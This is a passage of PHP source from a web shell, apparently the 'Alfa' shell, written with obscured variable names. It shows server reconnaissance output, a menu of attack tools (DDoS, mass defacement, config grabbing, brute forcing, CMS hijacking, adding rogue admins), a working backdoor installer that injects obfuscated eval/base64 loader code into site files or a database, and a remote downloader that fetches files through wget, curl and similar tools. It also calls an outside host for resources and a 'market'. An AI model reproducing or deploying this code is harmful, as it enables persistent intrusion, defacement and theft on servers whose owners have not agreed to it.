echo "$gstvxiofe2942a04780e223b215eb8b663cf5353 Domains";}}
else{echo("Cant Read [ /etc/named.conf ]");}
echo '</span></td>
</tr>
<tr>
<td height="16"><span class="header_vars">HDD:</span></td>
<td><span class="header_vars">Total:</span><b>'.alfaSize($irtldmrodb28f3b2aefa09d63dcd57583254de71).' </b><span class="header_vars">Free:</span><b>' . alfaSize($umbdwmvqa9cc6a00f8695708b1579c7988207667) . ' ['. (int) ($umbdwmvqa9cc6a00f8695708b1579c7988207667/$irtldmrodb28f3b2aefa09d63dcd57583254de71*100) . '%]</b></td>
</tr>';
if($GLOBALS['sys']=='unix'){
$yplxtorjb6c14dd0a35c2677b0f8641f7f50222a = '<tr><td height="18" colspan="2"><span class="header_vars">useful:</span><span class="header_values" id="header_useful">--------------</span></td></tr><td height="0" colspan="2"><span class="header_vars">Downloader: </span><span class="header_values" id="header_downloader">--------------</span></td></tr>';
if(!@ini_get('safe_mode')){
if(strlen(alfaEx("id",false,false))>0){
echo '<tr><td height="18" colspan="2"><span class="header_vars">Useful : </span>';
$aqkytwxj36c64de6d092aeae260585e2059c6c64 = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzialfa2','nc','locate','suidperl');
$fyyftmba9dd4e461268c8034f5c8564e155c67a6=0;
foreach($aqkytwxj36c64de6d092aeae260585e2059c6c64 as $geklwdir447b7147e84be512208dcc0995d67ebc)if(alfaWhich($geklwdir447b7147e84be512208dcc0995d67ebc)){$fyyftmba9dd4e461268c8034f5c8564e155c67a6++;echo '<span class="header_values" style="margin-left: 4px;">'.$geklwdir447b7147e84be512208dcc0995d67ebc.'</span>';}
if($fyyftmba9dd4e461268c8034f5c8564e155c67a6==0){echo "<span class='header_values' id='header_useful'>--------------</span>";$GLOBALS["need_to_update_header"] = "true";}
echo '</td>
</tr>
<tr>
<td height="0" colspan="2"><span class="header_vars">Downloader: </span>';
$vnvukupa1945d1530aa4d81dc5676da670c6d09b = array('wget','fetch','lynx','links','curl','get','lwp-mirror');
$fyyftmba9dd4e461268c8034f5c8564e155c67a6=0;
foreach($vnvukupa1945d1530aa4d81dc5676da670c6d09b as $cnlwvqoa235bacd9fe81ea549903a51e673bdbb9)if(alfaWhich($cnlwvqoa235bacd9fe81ea549903a51e673bdbb9)){$fyyftmba9dd4e461268c8034f5c8564e155c67a6++;echo '<span class="header_values" style="margin-left: 4px;">'.$cnlwvqoa235bacd9fe81ea549903a51e673bdbb9.'</span>';}
if($fyyftmba9dd4e461268c8034f5c8564e155c67a6==0){echo "<span class='header_values' id='header_downloader'>--------------</span>";$GLOBALS["need_to_update_header"] = "true";}
echo '</td>
</tr>';
}else{
echo $yplxtorjb6c14dd0a35c2677b0f8641f7f50222a;$GLOBALS["need_to_update_header"] = "true";
}
}else{
echo $yplxtorjb6c14dd0a35c2677b0f8641f7f50222a;$GLOBALS["need_to_update_header"] = "true";
}
}else{
echo '<tr><td height="18" colspan="2"><span class="header_vars">Windows:</span><b>';
echo alfaEx('ver',false,false);
echo '</td>
</tr> <tr>
<td height="0" colspan="2"><span class="header_vars">Downloader: </span><b>-------------</b></td>
</tr></b>';
}
$cxqmltus2150fd65034a9bcdb357943b3900a918 = (function_exists('get_magic_quotes_gpc')?get_magic_quotes_gpc():'0');if ($cxqmltus2150fd65034a9bcdb357943b3900a918 == "1" or $cxqmltus2150fd65034a9bcdb357943b3900a918 == "on"){$ymwafhdw2f3a4fccca6406e35bcf33e92dd93135 = '<b><span class="header_on">ON</span>';}else{$ymwafhdw2f3a4fccca6406e35bcf33e92dd93135 = '<span class="header_off">OFF</span>';}
echo '<tr>
<td height="16" colspan="2"><span class="header_vars">Disable Functions: </span><b>'.Alfa_GetDisable_Function().'</b></td>
</tr>
<tr>
<td height="16" colspan="2"><span class="header_vars">CURL :</span>'.$qqhrnrcwf6e57c9de709e45feb0d955351f53548.' | <span class="header_vars">SSH2 : </span>'.$njiaostw1eb174fa332c502d2b4929d74e5d1d64.' | <span class="header_vars">Magic Quotes : </span>'.$ymwafhdw2f3a4fccca6406e35bcf33e92dd93135.' | <span class="header_vars"> MySQL :</span>'.$uadvcujo81c3b080dad537de7e10e0987a4bf52e.' | <span class="header_vars">MSSQL :</span>'.$dffrmfjea0589ddd20d56ac0fd4c8f1c83177672.' | <span class="header_vars"> PostgreSQL :</span>'.$viobjnle235ec52392b77977539cf78b62e708d3.' | <span class="header_vars"> Oracle :</span>'.$okougdode81c4e4f2b7b93b481e13a8553c2ae1b.' '.($GLOBALS['sys']=="unix"?'| <span class="header_vars"> CGI :</span> '.$yowbntez96b22492d937bc3ace31d0abe38ba66d:"").'</td><td width="15%"><div id="alfa_solevisible"><center><a href="https://t.me/solevisible" target="_blank"><span><font class="solevisible-text" color="#0F0">Sole Sad & Invisible</font></span></a></center></div></td>
</tr>
<tr>
<td height="11" colspan="3"><span class="header_vars">Open_basedir :</span><b>'.$reeyunzd5289df8a8663eeaea5de3baad848212d.'</b> | <span class="header_vars">Safe_mode_exec_dir :</span><b>'.$iajnyxqb4c128155fac3a64697dbf1e7f69fa16d.'</b> | <span class="header_vars"> Safe_mode_include_dir :</span></b>'.$kodnhifb3fc7c001fae08c7c5462a0aa84e0edc0.'</b></td>
</tr>
<tr>
<td height="11"><span class="header_vars">SoftWare: </span></td>
<td colspan="2"><b>'.@getenv('SERVER_SOFTWARE').'</b></td>
</tr>';
if($GLOBALS['sys']=="win"){
echo '<tr>
<td height="12"><span class="header_vars">DRIVE:</span></td>
<td colspan="2"><b>'.$ykqnkwvw2b764bafdbf32ae530608c3ff8b2fd3b.'</b></td>
</tr>';
}
echo '<tr>
<td height="12"><span class="header_vars">PWD:</span></td>
<td colspan="2"><span id="header_cwd">'.$eimuvpaae95018b624f00c5735c8baacde05f940.' </span><a href="#action=fileman&path='.$GLOBALS['home_cwd'].'" onclick="g(\'FilesMan\',\'' . $GLOBALS['home_cwd'] . '\',\'\',\'\',\'\')"><span class="home_shell">[ Home Shell ]</span> </a></td>
</tr>
</table>
</div>
<div id="meunlist">
<ul>
';
$qjdtkkldd70c1e5d44de8a9150eb91ecff563578 = array('proc'=>'Process','phpeval'=>'Eval','sql'=>'SQL Manager','dumper'=>'Database Dumper','coldumper'=>'Column Dumper','hash'=>'En-Decoder','connect'=>'BC',
'zoneh'=>'ZONE-H','dos'=>'DDOS','safe'=>'ByPasser','cgishell'=>'Cgi Shell','ssiShell'=>'SSI SHELL','cpcrack'=>'Hash Tools',
'portscanner'=>'Port Scaner','basedir'=>'Open BaseDir','mail'=>'Fake Mail','ziper'=>'Compressor','deziper'=>'DeCompressor','IndexChanger'=>'Index Changer','pwchanger'=>'Add New Admin','ShellInjectors'=>'Shell Injectors',
'php2xml'=>'PHP2XML','cloudflare'=>'CloudFlare','Whmcs'=>'Whmcs DeCoder','symlink'=>'Symlink','MassDefacer'=>'Mass Defacer','Crackers'=>'BruteForcer','searcher'=>'Searcher','config_grabber'=>'Config Grabber','fakepage'=>'Fake Page','archive_manager'=>'Archive Manager',
'cmshijacker'=>'CMS Hijacker','remotedl'=>'Remote Upload','inbackdoor'=>'Install BackDoor','whois'=>'Whois','selfrm'=>'Remove Shell'
);
foreach($qjdtkkldd70c1e5d44de8a9150eb91ecff563578 as $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d=>$rkptsoeg2063c1608d6e0baf80249c42e2be5804){
echo('<li><a id="menu_opt_'.$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d.'" href="#action=options&path='.$GLOBALS['cwd'].'&opt='.$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d.'" class="menu_options" onclick="alfa_can_add_opt=true;this.href=\'#action=options&path=\'+c_+\'&opt='.$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d.'\';g(\''.$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d.'\',null,\'\',\'\',\'\');d.querySelector(\'.opt-title\').innerHTML=this.innerHTML;">'.$rkptsoeg2063c1608d6e0baf80249c42e2be5804.'</a></li>'."\n");
}
echo '</ul><div style="text-align: center;padding: 6px;"><a id="menu_opt_settings" href="#action=options&path='.$GLOBALS['cwd'].'&opt=settings" class="menu_options" onclick="alfa_can_add_opt=true;this.href=\'#action=options&path=\'+c_+\'&opt=settings\';g(\'settings\',null,\'\',\'\',\'\');d.querySelector(\'.opt-title\').innerHTML=this.innerHTML;">Alfa Settings</a><a style="display:none;" id="menu_opt_market" href="#action=options&path='.$GLOBALS['cwd'].'&opt=market" class="menu_options" onclick="alfa_can_add_opt=true;this.href=\'#action=options&path=\'+c_+\'&opt=market\';g(\'market\',null,\'\',\'\',\'\');d.querySelector(\'.opt-title\').innerHTML=this.innerHTML;"><span class="alfa_plus">Alfa market</span></a><a id="menu_opt_aboutus" href="#action=options&path='.$GLOBALS['cwd'].'&opt=aboutus" class="menu_options" onclick="alfa_can_add_opt=true;this.href=\'#action=options&path=\'+c_+\'&opt=aboutus\';g(\'aboutus\',null,\'\',\'\',\'\');d.querySelector(\'.opt-title\').innerHTML=this.innerHTML;">About Us</a>'.(!empty($_COOKIE['AlfaUser']) && !empty($_COOKIE['AlfaPass']) ? '<a href="javascript:void(0);" onclick="alfaLogOut();"><font color="red">LogOut</font></a>':'').'</div></div><div id="filesman_tabs"><div onmouseover="alfaFilesmanTabShowTitle(this,event);" onmouseout="alfaFilesmanTabHideTitle(this,event);" fm_counter="1" path="'.$GLOBALS['cwd'].'" fm_id="1" id="filesman_tab_1" class="filesman_tab filesman-tab-active" onclick="filesmanTabController(this);"><img class="folder-tab-icon" src="http://solevisible.com/icons/menu/folder2.svg"> <span>File manager</span></div><div style="display:inline-block;" id="filesman_tabs_child"></div><div id="filesman_new_tab" class="filesman_tab" style="background: maroon;" onClick="alfaFilesManNewTab(c_,\'/\',1);">New Tab +</div></div>';}else{
@error_reporting(E_ALL ^ E_NOTICE);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('magic_quotes_runtime', 0);
@set_time_limit(0);
}}
function alfalogout(){
@setcookie("AlfaUser", null, 2012);
@setcookie("AlfaPass", null, 2012);
unset($_COOKIE['AlfaUser'],$_COOKIE['AlfaPass']);
echo("ok");
}
function showAnimation($kkkpgnftb068931cc450442b63f5b3d276ea4297){
	return '-webkit-animation: '.$kkkpgnftb068931cc450442b63f5b3d276ea4297.' 800ms ease-in-out forwards;-moz-animation: '.$kkkpgnftb068931cc450442b63f5b3d276ea4297.' 800ms ease-in-out forwards;-ms-animation: '.$kkkpgnftb068931cc450442b63f5b3d276ea4297.' 800ms ease-in-out forwards;animation: '.$kkkpgnftb068931cc450442b63f5b3d276ea4297.' 800ms ease-in-out forwards;';
}
function __showicon($yxarqqmp4b43b0aee35624cd95b910189b3dc231){
	$fwekvgvg03c7c0ace395d80182db07ae2c30f034['btn']='http://solevisible.com/images/btn.png';
	$fwekvgvg03c7c0ace395d80182db07ae2c30f034['alfamini']='http://solevisible.com/images/alfamini.png';
	$fwekvgvg03c7c0ace395d80182db07ae2c30f034['loader']='http://solevisible.com/images/loader.svg';
	//return 'data:image/png;base64,'.__get_resource($s[$r]);
	return $fwekvgvg03c7c0ace395d80182db07ae2c30f034[$yxarqqmp4b43b0aee35624cd95b910189b3dc231];
}
function alfainbackdoor(){
alfahead();
echo '<div class=header><center><p><div class="txtfont_header">| Install BackDoor |</div></p><h3><a href=javascript:void(0) onclick="g(\'inbackdoor\',null,\'file\')">| In File | </a><a href=javascript:void(0) onclick="g(\'inbackdoor\',null,\'db\')">| In DataBase | </a></h3></center>';
$kowlomtecb5e100e5a9a3e7f6d1fd97512215282 = '<font color="red">Error In Inject BackDoor...!<br>File Loader is not Writable Or Not Exists...!</font>';
$fdcvmlyc260ca9dd8a4577fc00b7bd5810298076= '<font color="green">Success...!';
$paevkqwq6394d816bfb4220289a6f4b29cfb1834 = "<div style='display:none;' id='backdoor_textarea'><div class='txtfont'>Your Shell:</div><p><textarea name='shell' rows='19' cols='103'><?php\n\techo('Alfa Team is Here...!');\n?></textarea></p></div>";
$zhyqizus99938282f04071859941e18f16efcf42 = "<div class='txtfont'>Use:</div> <select name='method' style='width:155px;' onChange='inBackdoor(this);'><option value='alfa'>Alfa Team Uploader</option><option value='my'>My Private Shell</option></select>";
$lpndcjtf109633366fd0d46d371ede589998abaa = 'Example: /home/alfa/public_html/index.php';
if($_POST['alfa1']=='file'){
echo("<center><p><div class='txtfont_header'>| In File |</div></p><p><form onsubmit=\"g('inbackdoor',null,'file',this.method.value,this.file.value,this.shell.value,this.key.value);return false;\">{$zhyqizus99938282f04071859941e18f16efcf42} <div class='txtfont'>Backdoor Loader:</div> <input type='text' name='file' size='50' placeholder='{$lpndcjtf109633366fd0d46d371ede589998abaa}'> <div class='txtfont'>Key: </div> <input type='text' name='key' size='10' value='alfa'> <input type='submit' value=' '>{$paevkqwq6394d816bfb4220289a6f4b29cfb1834}</form></p></center>");
if($_POST['alfa2']!=''&&$_POST['alfa3']!=''&&$_POST['alfa4']!=''){
$qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce = $_POST['alfa2'];
$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac = $_POST['alfa3'];
$iyzktunq2591c98b70119fe624898b1e424b5e91 = $_POST['alfa4'];
$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d = str_replace(array('"','\''),'',trim($_POST['alfa5']));
if($ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d=='')$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d='alfa';
if($qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce=='my'){$iyzktunq2591c98b70119fe624898b1e424b5e91=__ZW5jb2Rlcg($iyzktunq2591c98b70119fe624898b1e424b5e91);}else{$iyzktunq2591c98b70119fe624898b1e424b5e91=$GLOBALS['__ALFA_SHELL_CODE'];}
$nndigmblc13367945d5d4c91047b3b50234aa7ab = '<?php if(isset($_GET["alfa"])&&$_GET["alfa"]=="'.$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d.'"){$func="cr"."ea"."te_"."fun"."ction";$x=$func("\$c","e"."v"."al"."(\'?>\'.base"."64"."_dec"."ode(\$c));");$x("'.$iyzktunq2591c98b70119fe624898b1e424b5e91.'");exit;}?>';
if(@is_file($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac)&&@is_writable($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac)){@file_put_contents($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac,$nndigmblc13367945d5d4c91047b3b50234aa7ab."\n".@file_get_contents($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac));__alert($fdcvmlyc260ca9dd8a4577fc00b7bd5810298076."<br>Run With: ".basename($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac)."?alfa=".$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d.'</font>');}else{__alert($kowlomtecb5e100e5a9a3e7f6d1fd97512215282);}}}
if($_POST['alfa1']=='db'){
echo("<center><p><div class='txtfont_header'>| In DataBase |</div></p>".getConfigHtml('all')."<p><form onsubmit=\"g('inbackdoor',null,'db',this.db_host.value,this.db_username.value,this.db_password.value,this.db_name.value,this.file.value,this.method.value,this.shell.value,this.key.value);return false;\">");
$qheyssydaab9e1de16f38176f86d7a92ba337a8d = array('td1' =>
array('color' => 'FFFFFF', 'tdName' => 'db_host : ', 'inputName' => 'db_host', 'id' => 'db_host', 'inputValue' => 'localhost', 'inputSize' => '50'),
'td2' =>
array('color' => 'FFFFFF', 'tdName' => 'db_username : ', 'inputName' => 'db_username', 'id' => 'db_user', 'inputValue' => '', 'inputSize' => '50'),
'td3' =>
array('color' => 'FFFFFF', 'tdName' => 'db_password : ', 'inputName' => 'db_password', 'id' => 'db_pw', 'inputValue' => '', 'inputSize' => '50'),
'td4' =>
array('color' => 'FFFFFF', 'tdName' => 'db_name : ', 'inputName' => 'db_name', 'id' => 'db_name', 'inputValue' => '', 'inputSize' => '50'),
'td5' =>
array('color' => 'FFFFFF', 'tdName' => 'Backdoor Loader: ', 'inputName' => 'file', 'inputValue' => $lpndcjtf109633366fd0d46d371ede589998abaa, 'inputSize' => '50', 'placeholder' => true),
'td6' =>
array('color' => 'FFFFFF', 'tdName' => 'Key: ', 'inputName' => 'key', 'inputValue' => 'alfa', 'inputSize' => '50')
);
create_table($qheyssydaab9e1de16f38176f86d7a92ba337a8d);
echo("<p>{$zhyqizus99938282f04071859941e18f16efcf42}</p>");
echo($paevkqwq6394d816bfb4220289a6f4b29cfb1834);
echo("<p><input type='submit' value=' '></p></form></p></center>");
if($_POST['alfa2']!=''&&$_POST['alfa3']!=''&&$_POST['alfa5']!=''&&$_POST['alfa6']!=''){
$coaoaskb8642fb61d2df2aba1f8c7f6bc918507e = $_POST['alfa2'];
$xeuplhus6402673de752e4271e326e0f2029848a = $_POST['alfa3'];
$nksmaoey5fd78de05123971c7fe530d759277c3c = $_POST['alfa4'];
$pghnyjea4cd4a49f25984e26fe708c1fbd896653 = $_POST['alfa5'];
$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac = $_POST['alfa6'];
$qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce = $_POST['alfa7'];
$iyzktunq2591c98b70119fe624898b1e424b5e91 = $_POST['alfa8'];
$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d = str_replace(array('"','\''),'',trim($_POST['alfa9']));
if($ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d=='')$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d='alfa';
if($qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce=='my'){$iyzktunq2591c98b70119fe624898b1e424b5e91=__ZW5jb2Rlcg($iyzktunq2591c98b70119fe624898b1e424b5e91);}else{$iyzktunq2591c98b70119fe624898b1e424b5e91=$GLOBALS['__ALFA_SHELL_CODE'];}
if($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898 = mysqli_connect($coaoaskb8642fb61d2df2aba1f8c7f6bc918507e,$xeuplhus6402673de752e4271e326e0f2029848a,$nksmaoey5fd78de05123971c7fe530d759277c3c,$pghnyjea4cd4a49f25984e26fe708c1fbd896653)){
$nndigmblc13367945d5d4c91047b3b50234aa7ab = '<?php if(isset($_GET["alfa"])&&$_GET["alfa"]=="'.$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d.'"){$conn=mysqli_connect("'.str_replace('"','\"',$coaoaskb8642fb61d2df2aba1f8c7f6bc918507e).'","'.str_replace('"','\"',$xeuplhus6402673de752e4271e326e0f2029848a).'","'.str_replace('"','\"',$nksmaoey5fd78de05123971c7fe530d759277c3c).'","'.str_replace('"','\"',$pghnyjea4cd4a49f25984e26fe708c1fbd896653).'");$q=mysqli_query($conn,"SELECT `code` FROM alfa_bc LIMIT 0,1");$r=mysqli_fetch_assoc($q);$func="cr"."ea"."te_"."fun"."ction";$x=$func("\$c","e"."v"."al"."(\'?>\'.base"."64"."_dec"."ode(\$c));");$x($r["code"]);exit;}?>';
if(@is_file($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac)&&@is_writable($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac)){
@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,'DROP TABLE `alfa_bc`');
@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,'CREATE TABLE `alfa_bc` (code LONGTEXT)');
@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,'INSERT INTO `alfa_bc` VALUES("'.$iyzktunq2591c98b70119fe624898b1e424b5e91.'")');
@file_put_contents($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac,$nndigmblc13367945d5d4c91047b3b50234aa7ab."\n".@file_get_contents($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac));
__alert($fdcvmlyc260ca9dd8a4577fc00b7bd5810298076."<br>Run With: ".basename($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac)."?alfa=".$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d.'</font>');}else{__alert($kowlomtecb5e100e5a9a3e7f6d1fd97512215282);}}}}
echo('</div>');
alfafooter();
}
function alfawhois(){
echo("<div class='header'><center><p><div class='txtfont_header'>| Whois |</div></p><p><form onsubmit=\"g('whois',null,this.url.value,'>>');return false;\"><div class='txtfont'>Url: </div> <input type='text' name='url' style='text-align:center;' size='50' placeholder='google.com'> <input type='submit' value=' '></form></p></center>");
if($_POST['alfa2']=='>>'&&!empty($_POST['alfa1'])){
$svjurwzc98defd6ee70dfb1dea416cecdf391f58 = str_replace(array('http://','https://','www.','ftp://'),'',$_POST['alfa1']);
$nyvfphvm42aefbae01d2dfd981f7da7d823d689e = 'http://api.whoapi.com/?apikey=093b6cb9e6ea724e101928647df3e009&r=whois&domain='.$svjurwzc98defd6ee70dfb1dea416cecdf391f58;
$sfmsaibm8d777f385d3dfec8815d20f7496026dc = @file_get_contents($nyvfphvm42aefbae01d2dfd981f7da7d823d689e);
if($sfmsaibm8d777f385d3dfec8815d20f7496026dc==''){$oirhhzwgb5eda0a74558a342cf659187f06f746f = new AlfaCURL();$oirhhzwgb5eda0a74558a342cf659187f06f746f->$dojqcedr54a2bf8c09ace67d3513aaa1aa7aa0f3 = true;$sfmsaibm8d777f385d3dfec8815d20f7496026dc = $oirhhzwgb5eda0a74558a342cf659187f06f746f->Send($nyvfphvm42aefbae01d2dfd981f7da7d823d689e);}
$nyvfphvm42aefbae01d2dfd981f7da7d823d689e = @json_decode($sfmsaibm8d777f385d3dfec8815d20f7496026dc,true);
echo __pre();
if(is_array($nyvfphvm42aefbae01d2dfd981f7da7d823d689e)){echo($nyvfphvm42aefbae01d2dfd981f7da7d823d689e["whois_raw"]);}else{echo alfaEx("whois ".$svjurwzc98defd6ee70dfb1dea416cecdf391f58);}}
echo("</div>");
}
function alfaremotedl(){
alfahead();
echo("<div class='header'><center><p><div class='txtfont_header'>| Upload From Url |</div></p><p>
<form onsubmit=\"g('remotedl',null,this.d.value,this.p.value,'>>');return false;\">
<p><div class='txtfont'>Url: </div>&nbsp;&nbsp;&nbsp;<input type='text' name='d' size='50'></p>
<div class='txtfont'>Path:</div> <input type='text' name='p' size='50' value='".$GLOBALS['cwd']."'><p><input type='submit' value=' '></p>
</form></p></center>");
if(isset($_POST['alfa1'],$_POST['alfa2'],$_POST['alfa3'])&&!empty($_POST['alfa1'])&&$_POST['alfa3']=='>>'){
echo __pre();
$fefubzei572d4e421e5e6b9bc11d815e8a027112 = $_POST['alfa1'];
$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485 = $_POST['alfa2'];
echo('<center>');
if(__download($fefubzei572d4e421e5e6b9bc11d815e8a027112,$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485)){
echo('<font color="green">Success...!</font>');
}else{
echo('<font color="red">Error...!</font>');
}
echo('</center>');
}
echo("</div>");
alfafooter();
}
function __download($fefubzei572d4e421e5e6b9bc11d815e8a027112,$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485=false){
if(!preg_match("/[a-z]+:\/\/.+/",$fefubzei572d4e421e5e6b9bc11d815e8a027112)) return false;
$clckqbwa3dec39dcd8987ae5b08ca11659f5392c = basename(rawurldecode($fefubzei572d4e421e5e6b9bc11d815e8a027112));
if($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485){$clckqbwa3dec39dcd8987ae5b08ca11659f5392c=$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485.$clckqbwa3dec39dcd8987ae5b08ca11659f5392c;}
if($mveevork9a0364b9e99bb480dd25e1f0284c8555 = __read_file($fefubzei572d4e421e5e6b9bc11d815e8a027112)){
if(@is_file($clckqbwa3dec39dcd8987ae5b08ca11659f5392c))@unlink($clckqbwa3dec39dcd8987ae5b08ca11659f5392c);
if(__write_file($clckqbwa3dec39dcd8987ae5b08ca11659f5392c, $mveevork9a0364b9e99bb480dd25e1f0284c8555)){return true;}}
$qlgrvckn93b3d744bab6e783cc1f4a2c79531378 = alfaEx("wget ".$fefubzei572d4e421e5e6b9bc11d815e8a027112." -O ".$clckqbwa3dec39dcd8987ae5b08ca11659f5392c);
if(@is_file($clckqbwa3dec39dcd8987ae5b08ca11659f5392c)) return true;
$qlgrvckn93b3d744bab6e783cc1f4a2c79531378 = alfaEx("curl ".$fefubzei572d4e421e5e6b9bc11d815e8a027112." -o ".$clckqbwa3dec39dcd8987ae5b08ca11659f5392c);
if(@is_file($clckqbwa3dec39dcd8987ae5b08ca11659f5392c)) return true;
$qlgrvckn93b3d744bab6e783cc1f4a2c79531378 = alfaEx("lwp-download ".$fefubzei572d4e421e5e6b9bc11d815e8a027112." ".$clckqbwa3dec39dcd8987ae5b08ca11659f5392c);
if(@is_file($clckqbwa3dec39dcd8987ae5b08ca11659f5392c)) return true;
$qlgrvckn93b3d744bab6e783cc1f4a2c79531378 = alfaEx("lynx -source ".$fefubzei572d4e421e5e6b9bc11d815e8a027112." > ".$clckqbwa3dec39dcd8987ae5b08ca11659f5392c);
if(@is_file($clckqbwa3dec39dcd8987ae5b08ca11659f5392c)) return true;
$qlgrvckn93b3d744bab6e783cc1f4a2c79531378 = alfaEx("GET ".$fefubzei572d4e421e5e6b9bc11d815e8a027112." > ".$clckqbwa3dec39dcd8987ae5b08ca11659f5392c);
if(@is_file($clckqbwa3dec39dcd8987ae5b08ca11659f5392c)) return true;
$qlgrvckn93b3d744bab6e783cc1f4a2c79531378 = alfaEx("links -source ".$fefubzei572d4e421e5e6b9bc11d815e8a027112." > ".$clckqbwa3dec39dcd8987ae5b08ca11659f5392c);
if(@is_file($clckqbwa3dec39dcd8987ae5b08ca11659f5392c)) return true;
$qlgrvckn93b3d744bab6e783cc1f4a2c79531378 = alfaEx("fetch -o ".$clckqbwa3dec39dcd8987ae5b08ca11659f5392c." -p ".$fefubzei572d4e421e5e6b9bc11d815e8a027112);
if(@is_file($clckqbwa3dec39dcd8987ae5b08ca11659f5392c)) return true;
return false;
}
function clean_string($syvgjxtsb45cffe084dd3d20d928bee85e7b0f21){
  if(function_exists("iconv")){
	  $fwekvgvg03c7c0ace395d80182db07ae2c30f034 = trim($syvgjxtsb45cffe084dd3d20d928bee85e7b0f21);
	  $fwekvgvg03c7c0ace395d80182db07ae2c30f034 = iconv("UTF-8", "UTF-8//IGNORE", $fwekvgvg03c7c0ace395d80182db07ae2c30f034);
  }
  return $fwekvgvg03c7c0ace395d80182db07ae2c30f034;
}
function __read_file($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac, $ofeeocdo65079b006e85a7e798abecb99e47c154 = true){
$mveevork9a0364b9e99bb480dd25e1f0284c8555 = false;
if($ojjazkws9226f86eb6b4ec0c78e8b8699a232c62 = @fopen($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac, "rb")){
$mveevork9a0364b9e99bb480dd25e1f0284c8555 = "";
while(!feof($ojjazkws9226f86eb6b4ec0c78e8b8699a232c62)){
$mveevork9a0364b9e99bb480dd25e1f0284c8555 .= $ofeeocdo65079b006e85a7e798abecb99e47c154 ? clean_string(fread($ojjazkws9226f86eb6b4ec0c78e8b8699a232c62, 8192)) : fread($ojjazkws9226f86eb6b4ec0c78e8b8699a232c62, 8192);
}
@fclose($ojjazkws9226f86eb6b4ec0c78e8b8699a232c62);
}
if(empty($mveevork9a0364b9e99bb480dd25e1f0284c8555)||!$mveevork9a0364b9e99bb480dd25e1f0284c8555){
	$mveevork9a0364b9e99bb480dd25e1f0284c8555 = alfaEx("cat '".addslashes($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac)."'");
}
return $mveevork9a0364b9e99bb480dd25e1f0284c8555;
}
function alfaMarket(){
echo "<div class='header'>";
$qqhrnrcwf6e57c9de709e45feb0d955351f53548 = new AlfaCURL();
$mveevork9a0364b9e99bb480dd25e1f0284c8555 = $qqhrnrcwf6e57c9de709e45feb0d955351f53548->Send("http://solevisible.com/market.php");
$sfmsaibm8d777f385d3dfec8815d20f7496026dc = @json_decode($mveevork9a0364b9e99bb480dd25e1f0284c8555, true);
if(!empty($sfmsaibm8d777f385d3dfec8815d20f7496026dc)){
if($sfmsaibm8d777f385d3dfec8815d20f7496026dc["status"] == "open"){
	echo $sfmsaibm8d777f385d3dfec8815d20f7496026dc["content"];
}else{
	echo $sfmsaibm8d777f385d3dfec8815d20f7496026dc["error_msg"];
}
}else{
	echo "<div style='text-align:center;font-size:20px;'>Cant connect to the alfa market....! try later.</div>";
}
echo "</div>";
}
function alfaSettings(){
alfahead();
AlfaNum(6,7,8,9,10);
echo '<div class=header><center><p><div class="txtfont_header">| Settings |</div></p><h3><a href=javascript:void(0) onclick="g(\'settings\',null,null,null,null,null,null,null,null,\'main\')">| Generall Setting | </a></h3></center>';
if($_POST["alfa8"] == "main"){
echo '<p><center><div class="txtfont_header">| Settings |</div></p><form onSubmit="reloadSetting(this);return false;" method=\'post\'>';
$yesqidvyf0d722d106665c8f1db553d507140848 = array('0'=>'No','1'=>'Yes');
$gkzajztu7904b9622e24a4786d4f34a348e88997 = array('false'=>'No','true'=>'Yes');
$lbsfntjsb65581e7ecc28dd2657cc0a374aa555c = "";
$ttwwrvsa111778af60cb1093cf33144d64cd3f29 = "";
$zfynbafa89916c6dc3576acb72931b354faf1ccd = "";
$ezsffanbe4ac821fee9d2c94c01acda0244a254f = "";
$cjnewkuz92666816abf61a64c2aa2a5c00286c55 = "";
